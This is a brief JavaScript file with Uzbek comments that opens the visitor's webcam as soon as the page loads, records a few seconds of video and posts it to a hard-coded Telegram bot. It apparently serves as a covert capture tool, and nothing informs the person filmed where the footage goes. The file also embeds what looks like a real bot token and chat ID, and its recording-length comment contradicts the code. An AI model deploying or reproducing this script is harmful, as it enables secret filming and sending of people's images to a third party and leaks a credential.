const video = document.getElementById('video');
let mediaRecorder;
let chunks = [];

// Telegram bot tokeni va chat ID
const BOT_TOKEN = '7395541428:AAGTGERMBx35uE7lm35_xfrOFJ2nWfy886k'; // Bot tokenini shu yerga qo'ying
const CHAT_ID = '5934257995'; // Chat ID-ni shu yerga qo'ying

// Kamera oqimini olish
function startCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            // MediaRecorder obyekti yaratish
            mediaRecorder = new MediaRecorder(stream);
            mediaRecorder.ondataavailable = (event) => {
                chunks.push(event.data);
            };
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                sendVideoToTelegram(blob);
            };

            // 10 soniya davomida video yozish
            mediaRecorder.start();
            setTimeout(() => {
                mediaRecorder.stop();
            }, 5000); // 10 soniya
        })
        .catch(error => {
            console.error('Xato:', error);
        });
}

// Telegram bot orqali video yuborish
function sendVideoToTelegram(blob) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, 'video.webm');

    fetch(url, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('Video yuborildi!');
        } else {
            console.error('Telegram API xatosi:', data);
        }
    })
    .catch(error => {
        console.error('Xato:', error);
    });
}

// Kamera ishga tushirish va avtomatik video yozishni boshlash
startCamera();
